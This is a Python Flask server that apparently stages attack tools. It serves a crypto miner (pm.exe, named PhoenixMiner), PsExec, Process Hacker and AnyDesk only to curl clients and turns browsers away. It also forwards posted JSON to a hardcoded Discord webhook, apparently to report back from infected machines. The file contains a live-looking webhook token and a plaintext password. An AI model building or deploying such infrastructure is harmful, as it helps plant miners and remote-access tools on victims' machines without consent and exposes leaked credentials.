from flask import Flask, request, abort, send_file
import requests
from flask_httpauth import HTTPBasicAuth
from werkzeug.security import generate_password_hash, check_password_hash
app = Flask(__name__)

DiscordURL = 'https://canary.discord.com/api/webhooks/900769374422585404/NBk9F9AN5Kx1ODmX32rvTFRW7PnkY4u8BQ-s7qynJABP6UZ3MlmkTlbMaLWVpjMtIqsV'
basicAuth = HTTPBasicAuth()
users = {
    "Zortos": generate_password_hash("Gamernexus123"),
}


@basicAuth.verify_password
def verify_password(username, password):
    if username in users and \
            check_password_hash(users.get(username), password):
        return username
    
@app.route('/api/download/pm.exe')
def downloadPhoenixMiner():
    path = "/pm.exe"
    useragent = request.headers.get('User-Agent')
    if 'curl' in useragent:
        return send_file(path, as_attachment=True)
    # For windows you need to use drive name [ex: F:/Example.pdf]
    else:
        print(useragent)
        return 'Access to that resource is forbidden.', 403

@app.route('/api/download/PsExec.exe')
def downloadpsexec():
    path = "/PsExec.exe"
    useragent = request.headers.get('User-Agent')
    if 'curl' in useragent:
        return send_file(path, as_attachment=True)
    # For windows you need to use drive name [ex: F:/Example.pdf]
    else:
        print(useragent)
        return 'Access to that resource is forbidden.', 403



@app.route('/api/download/ph64.exe')
def downloadProccessHack():
    path = "/ph64.exe"
    useragent = request.headers.get('User-Agent')
    if 'curl' in useragent:
        return send_file(path, as_attachment=True)
    # For windows you need to use drive name [ex: F:/Example.pdf]
    else:
        print(useragent)
        return 'Access to that resource is forbidden.', 403


@app.route('/api/download/Anydesk.exe')
def downloadAnydesk():
    path = "/Anydesk.exe"
    useragent = request.headers.get('User-Agent')
    
    if 'curl' in useragent:
        return send_file(path, as_attachment=True)
    # For windows you need to use drive name [ex: F:/Example.pdf]
    else:
        print(useragent)
        return 'Access to that resource is forbidden.', 403


@app.route('/discordwebhook', methods=['POST'])
def webhook():
    if request.method == 'POST':
        print(request.json)
        result = requests.post(DiscordURL, json=request.json)
        try:
            result.raise_for_status()
        except requests.exceptions.HTTPError as err:
            print(err)
        else:
            print("Payload delivered successfully, code {}.".format(
                result.status_code))
        return 'success', 200
    else:
        abort(400)


if __name__ == '__main__':
    app.run(host='0.0.0.0')
